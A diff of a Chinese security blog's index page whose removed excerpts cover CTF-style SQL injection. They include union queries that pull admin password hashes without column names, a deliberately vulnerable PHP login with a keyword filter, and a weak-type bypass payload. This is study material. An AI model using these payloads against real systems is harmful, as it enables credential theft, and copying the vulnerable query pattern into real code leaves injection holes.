-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-	
-
-	</div>
-  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+---+---+</span>
-<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
-<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
-<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+</span>
-<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
-<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>
-
-mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
-<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-	
-	</div>
-  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/11/23/order-by-blind.html" >基于order by的盲注</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-11-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-  $dbhost &#x3D; &quot;172.19.0.2&quot;;
-  $dbuser &#x3D; &quot;root&quot;;
-  $dbpass &#x3D; &quot;root&quot;;
-  $db &#x3D; &quot;vul&quot;;
-  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
-  mysqli_set_charset($conn,&quot;utf8&quot;);
- 
-  &#x2F;* sql
- 
-     create  table &#96;admin&#96; (
-        &#96;id&#96; int(10) not null primary key auto_increment,
-        &#96;username&#96; varchar(20) not null ,
-        &#96;password&#96; varchar(32) not null
-     );
-  *&#x2F;
-function   filter($str)&#123;
-      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
-      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
-      if(preg_match($filterlist,strtolower($str)))&#123;
-        die(&quot;illegal input!&quot;);
-      &#125;
-      return $str;
-  &#125;
-$username &#x3D; isset($_POST[&#39;username&#39;])?
-filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
-$password &#x3D; isset($_POST[&#39;password&#39;])?
-filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
-$sql &#x3D; &quot;select * from admin where  username &#x3D;
- &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
- 
-$res &#x3D; $conn -&gt; query($sql);
-if($res-&gt;num_rows&gt;0)&#123;
-  $row &#x3D; $res -&gt; fetch_assoc();
-  if($row[&#39;id&#39;])&#123;
-     echo $row[&#39;username&#39;];
-  &#125;
-&#125;else&#123;
-   echo &quot;The content in the password column is the &quot;;
-&#125;
- 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
-<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
-<p><img src="/2017/11/23/order-by-blind/2.png"></p>
-<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
-select * from admin where username&#x3D;&#39;&#39;&#x2F;2
-select * from admin where username&#x3D;&#39;&#39;^1^1
-select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后是基于order by的盲注：</p>
-<p>首先是基本知识:</p>
-	
-
-	</div>
-  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-  $dbhost &#x3D; &quot;172.19.0.2&quot;;
-  $dbuser &#x3D; &quot;root&quot;;
-  $dbpass &#x3D; &quot;root&quot;;
-  $db &#x3D; &quot;vul&quot;;
-  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
-  mysqli_set_charset($conn,&quot;utf8&quot;);
- 
-  &#x2F;* sql
- 
-     create  table &#96;admin&#96; (
-        &#96;id&#96; int(10) not null primary key auto_increment,
-        &#96;username&#96; varchar(20) not null ,
-        &#96;password&#96; varchar(32) not null
-     );
-  *&#x2F;
-function   filter($str)&#123;
-      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
-      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
-      if(preg_match($filterlist,strtolower($str)))&#123;
-        die(&quot;illegal input!&quot;);
-      &#125;
-      return $str;
-  &#125;
-$username &#x3D; isset($_POST[&#39;username&#39;])?
-filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
-$password &#x3D; isset($_POST[&#39;password&#39;])?
-filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
-$sql &#x3D; &quot;select * from admin where  username &#x3D;
- &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
- 
-$res &#x3D; $conn -&gt; query($sql);
-if($res-&gt;num_rows&gt;0)&#123;
-  $row &#x3D; $res -&gt; fetch_assoc();
-  if($row[&#39;id&#39;])&#123;
-     echo $row[&#39;username&#39;];
-  &#125;
-&#125;else&#123;
-   echo &quot;The content in the password column is the &quot;;
-&#125;
- 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
-<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
-<p><img src="/2017/11/23/order-by-blind/2.png"></p>
-<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
-select * from admin where username&#x3D;&#39;&#39;&#x2F;2
-select * from admin where username&#x3D;&#39;&#39;^1^1
-select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后是基于order by的盲注：</p>
-<p>首先是基本知识:</p>
-	
-	</div>
-  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1120,6 +1004,8 @@ select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
@@ -1145,23 +1031,23 @@ select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
       </li>
     
       <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
       </li>
     
   </ul>
